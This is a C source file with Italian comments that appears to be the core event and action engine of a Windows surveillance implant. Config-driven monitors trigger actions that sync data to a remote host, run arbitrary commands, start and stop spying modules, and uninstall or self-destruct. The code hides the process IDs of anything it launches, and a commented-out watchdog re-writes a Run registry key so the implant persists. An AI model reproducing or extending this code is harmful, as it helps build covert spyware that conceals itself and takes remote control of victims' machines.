#include <windows.h>
#include "common.h"
#include "H4-DLL.h"
#include "demo_functions.h"
#include "UnHookClass.h"
#include "DeepFreeze.h"
#include "x64.h"
#include "status_log.h"
#include "SM_Core.h"
#include "SM_ActionFunctions.h"
#include "JSON\JSON.h"
#include "SM_EventHandlers.h"

// Il sistema si basa su condizioni->eventi->azioni
// Un event monitor, quando si verifica una condizione, genera un evento. Le condizioni sono verificate a discrezione
// dell'event monitor (EM)stesso in base al Param passato alla funzione pEventMonitorAdd. 
// Quando una condizione si verifica, l'EM richiama TriggerEvent. Il SyncManager monitora gli eventi e, quando ne
// rileva uno, esegue le azioni associate nella sua tabella eventi/azioni.


#define MAX_EVENT_MONITOR 15 // Massimo numero di event monitor registrabili
#define MAX_DISPATCH_FUNCTION 15 // Massimo numero di azioni registrabili
#define SYNCM_SLEEPTIME 100

typedef void (WINAPI *EventMonitorAdd_t) (JSONObject, event_param_struct *, DWORD);
typedef void (WINAPI *EventMonitorStart_t) (void);
typedef void (WINAPI *EventMonitorStop_t) (void);
typedef BOOL (WINAPI *ActionFunc_t) (BYTE *);

ActionFunc_t ActionFuncGet(DWORD action_type, BOOL *is_fast_action);

typedef void (WINAPI *conf_callback_t)(JSONObject, DWORD counter);
extern BOOL HM_ParseConfSection(char *conf, WCHAR *section, conf_callback_t call_back);
extern BOOL HM_CountConfSection(char *conf, WCHAR *section, DWORD *count);
extern DWORD AM_GetAgentTag(const WCHAR *agent_name);

// Gestione event monitor  ----------------------------------------------

typedef struct  {
	WCHAR event_type[32];
	EventMonitorAdd_t pEventMonitorAdd;
	EventMonitorStart_t pEventMonitorStart;
	EventMonitorStop_t pEventMonitorStop;
} event_monitor_elem;

// Struttura per gestire i thread di ripetizione
typedef struct {
	DWORD event_id;
	DWORD repeat_action;
	DWORD count; 
	DWORD delay;
	BOOL  semaphore;
} repeated_event_struct;

// Struttura della tabella degli eventi
typedef struct {
	BOOL event_enabled;
	repeated_event_struct repeated_event;
	HANDLE repeated_thread;
} event_table_struct;

// Tabella degli event monitor attualmente registrati
DWORD event_monitor_count = 0;
event_monitor_elem event_monitor_array[MAX_EVENT_MONITOR];

// Tabella contenente lo stato di attivazione di tutti gli eventi nel file di configurazione
event_table_struct *event_table = NULL;
DWORD event_count = 0;

DWORD WINAPI RepeatThread(repeated_event_struct *repeated_event)
{
	DWORD i = 0;
	LOOP {
		CANCELLATION_SLEEP(repeated_event->semaphore, repeated_event->delay);
		if (i < repeated_event->count) {
			i++;
			TriggerEvent(repeated_event->repeat_action, repeated_event->event_id);
		}
	}
	return 0;
}

// Permette di gestire i repeat degli eventi
void CreateRepeatThread(DWORD event_id, DWORD repeat_action, DWORD count, DWORD delay)
{
	DWORD dummy;

	// Non c'e' nessuna azione da fare
	if (repeat_action == AF_NONE || count == 0 || delay<1000)
		return;
	// L'evento non e' riconosciuto
	if (event_id >= event_count)
		return;
	// C'e' gia' un thread attivo per quell'evento
	if (event_table[event_id].repeated_thread)
		return;

	event_table[event_id].repeated_event.count = count;
	event_table[event_id].repeated_event.delay = delay;
	event_table[event_id].repeated_event.event_id = event_id;
	event_table[event_id].repeated_event.repeat_action = repeat_action;
	event_table[event_id].repeated_event.semaphore = FALSE;

	event_table[event_id].repeated_thread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RepeatThread, &event_table[event_id].repeated_event, 0, &dummy);
}

void StopRepeatThread(DWORD event_id)
{
	// L'evento non e' riconosciuto
	if (event_id >= event_count)
		return;

	QUERY_CANCELLATION(event_table[event_id].repeated_thread, event_table[event_id].repeated_event.semaphore);
}

// Registra un nuovo event monitor
void EventMonitorRegister(WCHAR *event_type, EventMonitorAdd_t pEventMonitorAdd, 
						  EventMonitorStart_t pEventMonitorStart,
						  EventMonitorStop_t pEventMonitorStop)
{
	if (event_monitor_count >= MAX_EVENT_MONITOR)
		return;

	swprintf_s(event_monitor_array[event_monitor_count].event_type, L"%s", event_type);
	event_monitor_array[event_monitor_count].pEventMonitorAdd = pEventMonitorAdd;
	event_monitor_array[event_monitor_count].pEventMonitorStop = pEventMonitorStop;
	event_monitor_array[event_monitor_count].pEventMonitorStart = pEventMonitorStart;

	event_monitor_count++;
}

void EventMonitorStartAll()
{
	DWORD i;
	for (i=0; i<event_monitor_count; i++)
		if (event_monitor_array[i].pEventMonitorStart)
			event_monitor_array[i].pEventMonitorStart();
}

void EventMonitorStopAll()
{
	DWORD i;
	for (i=0; i<event_monitor_count; i++)
		if (event_monitor_array[i].pEventMonitorStop)
			event_monitor_array[i].pEventMonitorStop();
}

void EventTableInit()
{
	SAFE_FREE(event_table);
	event_count = 0;
}

// Setta lo stato iniziale di un evento
void SM_EventTableState(DWORD event_id, BOOL state)
{
	event_table_struct *temp_event_table;
	// Alloca la tabella per contenere quel dato evento 
	// La tabella e' posizionale
	if (event_id >= event_count) {
		temp_event_table = (event_table_struct *)realloc(event_table, (event_id + 1) * sizeof(event_table_struct));
		if (!temp_event_table)
			return;
		event_table = temp_event_table;
		event_count = event_id + 1;
		event_table[event_id].repeated_thread = NULL;
		ZeroMemory(&event_table[event_id].repeated_event, sizeof(repeated_event_struct));
	}
	event_table[event_id].event_enabled = state;
}

// Assegna una riga "evento" della configurazione al corretto event monitor
void EventMonitorAddLine(const WCHAR *event_type, JSONObject conf_json, event_param_struct *event_param, DWORD event_id, BOOL event_state)
{
	DWORD i;
	// Inizializza lo stato attivo/disattivo dell'evento
	SM_EventTableState(event_id, event_state);

	for (i=0; i<event_monitor_count; i++)
		if (!wcsicmp(event_monitor_array[i].event_type, event_type)) {
			event_monitor_array[i].pEventMonitorAdd(conf_json, event_param, event_id);
			break;
		}
}

BOOL EventIsEnabled(DWORD event_id)
{
	// L'evento non e' mai stato visto e inizializzato
	if (event_id >= event_count)
		return FALSE;

	return event_table[event_id].event_enabled;
}
//------------------------------------------------------------------




// Tabella delle actions ------------------------------------------

typedef struct {
	ActionFunc_t pActionFunc; // Puntatore alla funzione che effettua l'action
	BYTE *param;              // Puntatore all'array contenente i parametri
} action_elem;

typedef struct {
	DWORD subaction_count; // numero di azioni collegate all'evento 
	action_elem *subaction_list; // puntatore all'array delle azioni 
	BOOL is_fast_action; // e' TRUE se non contiene alcuna sottoazione lenta (sync, uninst e execute)
	BOOL triggered; // Se l'evento e' triggerato o meno
} event_action_elem;

static event_action_elem *event_action_array = NULL; // Puntatore all'array dinamico contenente le actions.
                                                     // Si chiude con una entry nulla.
static DWORD event_action_count = 0; // Numero di elementi nella tabella event/actions

// Funzione da esportare (per eventuali event monitor esterni o per far generare eventi anche 
// agli agents). Triggera l'evento "index". L'event_id indica quale evento sta triggerando l'azione.
// Se l'evento e' stato disabilitato, l'azione non e' triggerata
void TriggerEvent(DWORD index, DWORD event_id)
{
	// Se e' uguale ad AF_NONE sara' sicuramente > event_action_count
	if (index >= event_action_count)
		return;

	// L'azione viene effettivamente triggerata solo se l'evento che l'ha generata
	// e' attivo in quel momento
	if (EventIsEnabled(event_id))
		event_action_array[index].triggered = TRUE;
}

// Cerca un evento qualsiasi che e' stato triggerato. Se lo trova torna TRUE e valorizza
// il puntatore all'array delle relative actions e il numero delle actions stesse.
// Legge solo le azioni lente
BOOL ReadEventSlow(DWORD *event_id)
{
	static DWORD i = 0;

	for (; i<event_action_count; i++) 
		if (event_action_array[i].triggered && !event_action_array[i].is_fast_action) {
			event_action_array[i].triggered = FALSE;
			*event_id = i;
			// Evita che lo stesso evento possa 
			// essere triggerato continuamente	
			i++; 
			return TRUE;
		}

	i = 0;
	return FALSE;
}

// Legge solo azioni veloci
BOOL ReadEventFast(DWORD *event_id)
{
	static DWORD i = 0;

	for (; i<event_action_count; i++) 
		if (event_action_array[i].triggered && event_action_array[i].is_fast_action) {
			event_action_array[i].triggered = FALSE;
			*event_id = i;
			// Evita che lo stesso evento possa 
			// essere triggerato continuamente	
			i++; 
			return TRUE;
		}

	i = 0;
	return FALSE;
}

// Esegue le actions indicate
void DispatchEvent(DWORD event_id)
{
	DWORD i;

	// Se l'action torna TRUE (es: nuova configurazione), smette di eseguire
	// sottoazioni che potrebbero non esistere piu'
	for (i=0; i<event_action_array[event_id].subaction_count; i++) {
		if (event_action_array[event_id].subaction_list[i].pActionFunc) {
			if (event_action_array[event_id].subaction_list[i].pActionFunc(event_action_array[event_id].subaction_list[i].param))
				break;
		}
	}
}


// Aggiunge una sotto-azione per l'azione "event_number" 
// Torna FALSE solo se ha inserito con successo una azione slow
BOOL ActionTableAddSubAction(DWORD event_number, DWORD subaction_type, BYTE *param)
{
	void *temp_action_list;
	BOOL is_fast_action;
	DWORD subaction_count;

	// Se l'evento non esiste nella event_action table ritorna
	if (event_number >= event_action_count)
		return TRUE;

	// All'inizio subaction_list e subaction_count sono a 0 perche' azzerate nella ActionTableInit
	// XXX si, c'e' un int overflow se ci sono 2^32 sotto azioni che potrebbe portare a un exploit nello heap (es: double free)....
	temp_action_list = realloc(event_action_array[event_number].subaction_list, sizeof(action_elem) * (event_action_array[event_number].subaction_count + 1) );

	// Se non riesce ad aggiungere la nuova sottoazione lascia tutto com'e'
	if (!temp_action_list)
		return TRUE;

	// Se l'array delle sottoazioni e' stato ampliato con successo, incrementa il numero delle sottoazioni
	// e aggiunge la nuova subaction
	subaction_count = event_action_array[event_number].subaction_count++;
	event_action_array[event_number].subaction_list = (action_elem *)temp_action_list;
	event_action_array[event_number].subaction_list[subaction_count].pActionFunc = ActionFuncGet(subaction_type, &is_fast_action);

	event_action_array[event_number].subaction_list[subaction_count].param = param;

	return is_fast_action;
}



// Quando questa funzione viene chiamata non ci devono essere thread attivi 
// che possono chiamare la funizone TriggerEvent. Dovrei proteggerlo come CriticalSection
// ma mi sembra sprecato in questo contesto (basta solo fare un po' di attenzione se si dovesse
// verificare il caso).
void ActionTableInit(DWORD number)
{
	DWORD i,j;
	event_action_elem *temp_event_action_array = NULL;

	// Libera gli eventuali parametri allocati nella precedente configurazione
	for (i=0; i<event_action_count; i++) {
		for (j=0; j<event_action_array[i].subaction_count; j++)
			SAFE_FREE(event_action_array[i].subaction_list[j].param);

		SAFE_FREE(event_action_array[i].subaction_list);
	}

	// Alloca una nuova tabella
	if (number)
		temp_event_action_array = (event_action_elem *)realloc(event_action_array, number * sizeof(event_action_elem));

	if (temp_event_action_array) {
		event_action_count = number;
		event_action_array = temp_event_action_array;
		ZERO(event_action_array, number * sizeof(event_action_elem));
		for (i=0; i<event_action_count; i++) 
			event_action_array[i].is_fast_action = TRUE; // all'inizio conta tutte come fast actions
	} else {
		event_action_count = 0;
		SAFE_FREE(event_action_array);
		return;
	}
}

//----------------------------------------------------------------






// Gestione delle action function registrate -----------------------------------------------------------
typedef struct {
	DWORD action_type;
	ActionFunc_t pActionFunc;
	BOOL is_fast_action;
} dispatch_func_elem;


// Tabella delle azioni di default
DWORD dispatch_func_count = 0;
dispatch_func_elem dispatch_func_array[MAX_DISPATCH_FUNCTION];


// Registra un'action
void ActionFuncRegister(DWORD action_type, ActionFunc_t pActionFunc, BOOL is_fast_action)
{
	if (dispatch_func_count >= MAX_DISPATCH_FUNCTION)
		return;

	dispatch_func_array[dispatch_func_count].action_type = action_type;
	dispatch_func_array[dispatch_func_count].pActionFunc = pActionFunc;
	dispatch_func_array[dispatch_func_count].is_fast_action = is_fast_action;

	dispatch_func_count++;
}


// Ritorna il puntatore alla funzione di action associata ad un certo action_type
ActionFunc_t ActionFuncGet(DWORD action_type, BOOL *is_fast_action)
{
	DWORD i;

	if (is_fast_action)
		*is_fast_action = TRUE;
	for (i=0; i<dispatch_func_count; i++)
		if (dispatch_func_array[i].action_type == action_type) {
			if (is_fast_action)
				*is_fast_action = dispatch_func_array[i].is_fast_action;
			return dispatch_func_array[i].pActionFunc;
		}

	return NULL;
}

//-----------------------------------------------------------------------------------
void WINAPI ParseEvents(JSONObject conf_json, DWORD counter)
{
	event_param_struct event_param;

	if (conf_json[L"start"])
		event_param.start_action = conf_json[L"start"]->AsNumber();
	else
		event_param.start_action = AF_NONE;

	if (conf_json[L"end"])
		event_param.stop_action = conf_json[L"end"]->AsNumber();
	else
		event_param.stop_action = AF_NONE;

	if (conf_json[L"repeat"])
		event_param.repeat_action = conf_json[L"repeat"]->AsNumber();
	else
		event_param.repeat_action = AF_NONE;

	if (conf_json[L"iter"])
		event_param.count = conf_json[L"iter"]->AsNumber();
	else
		event_param.count = 0xFFFFFFFF;

	if (conf_json[L"delay"]) {
		event_param.delay = (conf_json[L"delay"]->AsNumber() * 1000);
		if (event_param.delay == 0)
			event_param.delay = 1;
	} else
		event_param.delay = 1;

	EventMonitorAddLine(conf_json[L"event"]->AsString().c_str(), conf_json, &event_param, counter, conf_json[L"enabled"]->AsBool());
}

BYTE *ParseActionParameter(JSONObject conf_json, DWORD *tag)
{
	WCHAR action[64];
	BYTE *param = NULL;
	
	if (tag)
		*tag = AF_NONE;

	_snwprintf_s(action, 64, _TRUNCATE, L"%s", conf_json[L"action"]->AsString().c_str());		

	if (!wcscmp(action, L"log")) {
		*tag = AF_LOGINFO;
		param = (BYTE *)wcsdup(conf_json[L"text"]->AsString().c_str());

	} else if (!wcscmp(action, L"synchronize")) {
		typedef struct {
			DWORD min_sleep;
			DWORD max_sleep;
			DWORD band_limit;
			BOOL  exit_after_completion;
			char asp_server[1];
		} sync_conf_struct;
		sync_conf_struct *sync_conf;
		*tag = AF_SYNCRONIZE;
		param = (BYTE *)malloc(sizeof(sync_conf_struct) + wcslen(conf_json[L"host"]->AsString().c_str())*2);
		if (param) {
			sync_conf = (sync_conf_struct *)param;
			sync_conf->min_sleep = conf_json[L"mindelay"]->AsNumber();
			sync_conf->max_sleep = conf_json[L"maxdelay"]->AsNumber();
			sync_conf->band_limit= conf_json[L"bandwidth"]->AsNumber();
			sync_conf->exit_after_completion = conf_json[L"stop"]->AsBool();
			sprintf(sync_conf->asp_server, "%S", conf_json[L"host"]->AsString().c_str());
		}

	} else if (!wcscmp(action, L"execute")) {
		*tag = AF_EXECUTE;
		DWORD len = wcslen(conf_json[L"command"]->AsString().c_str());
		param = (BYTE *)malloc(len+1);
		sprintf((char *)param, "%S", conf_json[L"command"]->AsString().c_str());
	} else if (!wcscmp(action, L"uninstall")) {
		*tag = AF_UNINSTALL;

	} else if (!wcscmp(action, L"module")) {
		if (!wcscmp(conf_json[L"status"]->AsString().c_str(), L"start"))
			*tag = AF_STARTAGENT;
		else
			*tag = AF_STOPAGENT;
		param = (BYTE *)malloc(sizeof(DWORD));
		if (param) {
			DWORD agent_tag = AM_GetAgentTag(conf_json[L"module"]->AsString().c_str());
			memcpy(param, &agent_tag, sizeof(DWORD));
		}

	} else if (!wcscmp(action, L"event")) {
		if (!wcscmp(conf_json[L"status"]->AsString().c_str(), L"enable"))
			*tag = AF_STARTEVENT;
		else
			*tag = AF_STOPEVENT;
		param = (BYTE *)malloc(sizeof(DWORD));
		if (param) {
			DWORD event_id = conf_json[L"event"]->AsNumber();
			memcpy(param, &event_id, sizeof(DWORD));
		}
	} else if (!wcscmp(action, L"destroy")) {
		*tag = AF_DESTROY;
		param = (BYTE *)malloc(sizeof(BOOL));
		if (param) {
			BOOL isPermanent = conf_json[L"permanent"]->AsBool();
			memcpy(param, &isPermanent, sizeof(BOOL));
		}
	}
	return param;
}

void WINAPI ParseActions(JSONObject conf_json, DWORD counter)
{
	JSONArray subaction_array;
	DWORD i;
	DWORD tag;
	BYTE *conf_ptr;

	if (!conf_json[L"subactions"])
		return;
	subaction_array = conf_json[L"subactions"]->AsArray();

	for (i=0; i<subaction_array.size(); i++) {
		JSONObject subaction;
		if (!subaction_array[i]->IsObject())
			continue;
		subaction = subaction_array[i]->AsObject();
		conf_ptr = ParseActionParameter(subaction, &tag);
		// Se ha aggiunto una subaction "slow" marca tutta l'action come slow
		// Basta una subaction slow per marcare tutto l'action
		if (!ActionTableAddSubAction(counter, tag, conf_ptr)) 
			event_action_array[counter].is_fast_action = FALSE;
	}
}

// Istruisce gli EM per il monitor degli eventi e popola l'action table sulla base 
// del file di configurazione
void UpdateEventConf()
{
	DWORD action_count;
	char *conf_memory;
	if (!(conf_memory = HM_ReadClearConf(H4_CONF_FILE)))
		return;

	// Legge gli eventi
	EventTableInit();
	HM_ParseConfSection(conf_memory, L"events", &ParseEvents);

	// Legge le azioni
	HM_CountConfSection(conf_memory, L"actions", &action_count);
	ActionTableInit(action_count);
	HM_ParseConfSection(conf_memory, L"actions", &ParseActions);

	SAFE_FREE(conf_memory);
}


// Lista dei processi eseguiti
DWORD *process_executed = NULL;
#define MAX_PROCESS_EXECUTED 512
// Gestisce la lista dei processi eseguiti. Quando un processo
// non esiste piu' elimina l'hiding per il PID corrispondente.
void SM_HandleExecutedProcess()
{
	DWORD i;
	char *proc_name;
	pid_hide_struct pid_hide = NULL_PID_HIDE_STRUCT;

	// Questa funzione viene richiamata prima che possa essere 
	// eseguita SM_AddExecutedProcess: quindi e' questa che si 
	// preoccupa di inizializzare l'array dei PID
	if (!process_executed) {
		process_executed = (DWORD *)calloc(MAX_PROCESS_EXECUTED, sizeof(DWORD));
		return;
	}

	// Cicla la lista dei processi eseguiti
	for (i=0; i<MAX_PROCESS_EXECUTED; i++)
		if (process_executed[i]) {
			proc_name = HM_FindProc(process_executed[i]);
			// Se ora il PID non esiste piu' elimina l'hide
			// e lo toglie dalla lista.
			if (!proc_name) {
				SET_PID_HIDE_STRUCT(pid_hide, process_executed[i]);
				AM_RemoveHide(HIDE_PID, &pid_hide);
				process_executed[i] = 0;
			}
			SAFE_FREE(proc_name);
		}
}


// Aggiunge un processo alla lista di quelli eseguiti come azione
// Ne effettua anche l'hiding
void SM_AddExecutedProcess(DWORD pid)
{
	DWORD i;
	pid_hide_struct pid_hide = NULL_PID_HIDE_STRUCT;

	// Aggiorna la lista dei PID eseguiti (se e' allocata)
	if (!process_executed)
		return;

	// Nasconde il PID passato
	SET_PID_HIDE_STRUCT(pid_hide, pid);
	AM_AddHide(HIDE_PID, &pid_hide);

	// Cerca un posto libero e inserisce il PID
	for (i=0; i<MAX_PROCESS_EXECUTED; i++)
		if (!process_executed[i]) {
			process_executed[i] = pid;
			break;
		}
}

// Loop di gestione delle azioni FAST
DWORD WINAPI FastActionsThread(DWORD dummy)
{
	DWORD event_id;
	LOOP {
		CANCELLATION_POINT(bInstantActionThreadSemaphore);
		if (ReadEventFast(&event_id)) 
			DispatchEvent(event_id);
		else
			Sleep(SYNCM_SLEEPTIME);

	}
	return 0;
}

/*
#define EVERY_N_CYCLES(x) static DWORD i=0; i++; if (i%x == 0)
void RegistryWatchdog()
{
	static char key_value[DLLNAMELEN*3] = "";
	DWORD key_size;
	HKEY hOpen;

	if (FNC(RegOpenKeyA)(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) != ERROR_SUCCESS)
		return;

	key_size = sizeof(key_value) - 1;
	if (RegQueryValueEx(hOpen, REGISTRY_KEY_NAME, NULL, NULL, (unsigned char *)key_value, &key_size) == ERROR_FILE_NOT_FOUND) {
		if (key_value[0] != 0) // Verifica che abbia un valore memorizzato per la stringa
			FNC(RegSetValueExA)(hOpen, REGISTRY_KEY_NAME, NULL, REG_EXPAND_SZ, (unsigned char *)key_value, strlen(key_value)+1);
	} 

	FNC(RegCloseKey)(hOpen);
}*/

// Ciclo principale di monitoring degli eventi. E' praticamente il ciclo principale di tutto il client core.
void SM_MonitorEvents(DWORD dummy)
{
	DWORD event_id;
	DWORD dummy2;

	InitializeCriticalSection(&action_critic_sec);

	// Registrazione degli EM e delle AF. 
	EventMonitorRegister(L"timer", EM_TimerAdd, EM_TimerStart, EM_TimerStop);
	EventMonitorRegister(L"afterinst", EM_TimerAdd, NULL, NULL);
	EventMonitorRegister(L"date", EM_TimerAdd, NULL, NULL);
	EventMonitorRegister(L"process", EM_MonProcAdd, EM_MonProcStart, EM_MonProcStop);
	EventMonitorRegister(L"connection", EM_MonConnAdd, EM_MonConnStart, EM_MonConnStop);
	EventMonitorRegister(L"screensaver", EM_ScreenSaverAdd, EM_ScreenSaverStart, EM_ScreenSaverStop);	
	EventMonitorRegister(L"winevent", EM_MonEventAdd, EM_MonEventStart, EM_MonEventStop);	
	EventMonitorRegister(L"quota", EM_QuotaAdd, EM_QuotaStart, EM_QuotaStop);	
	EventMonitorRegister(L"window", EM_NewWindowAdd, EM_NewWindowStart, EM_NewWindowStop);
	EventMonitorRegister(L"idle", EM_UserIdlesAdd, EM_UserIdlesStart, EM_UserIdlesStop);

	ActionFuncRegister(AF_SYNCRONIZE, DA_Syncronize, FALSE);
	ActionFuncRegister(AF_STARTAGENT, DA_StartAgent, TRUE);
	ActionFuncRegister(AF_STOPAGENT, DA_StopAgent, TRUE);
	ActionFuncRegister(AF_EXECUTE, DA_Execute, FALSE);
	ActionFuncRegister(AF_UNINSTALL, DA_Uninstall, FALSE);
	ActionFuncRegister(AF_LOGINFO, DA_LogInfo, TRUE);
	ActionFuncRegister(AF_STARTEVENT, DA_StartEvent, TRUE);
	ActionFuncRegister(AF_STOPEVENT, DA_StopEvent, TRUE);
	ActionFuncRegister(AF_DESTROY, DA_Destroy, TRUE);

	// Legge gli eventi e le azioni dal file di configurazione. 
	// Deve essere sempre posizionato DOPO la registrazione di EM e AF
	UpdateEventConf();
	EventMonitorStartAll();

	// Lancia il thread che gestira' gli eventi FAST
	hInstantActionThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)FastActionsThread, NULL, 0, &dummy2);

	// Ciclo principale di lettura degli eventi
	LOOP {
		// Watchdog per la chiave nel registry (una volta ogni 10 cicli)
		/*EVERY_N_CYCLES(10)
			RegistryWatchdog();*/

		// Gestisce la lista dei processi eseguiti
		// (va eseguita per prima nel loop).
		SM_HandleExecutedProcess();

		if (ReadEventSlow(&event_id)) 
			DispatchEvent(event_id);
		else
			Sleep(SYNCM_SLEEPTIME);
	}
}

void SM_StartMonitorEvents(void)
{
	DWORD dummy;
	HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SM_MonitorEvents, NULL, 0, &dummy);
}
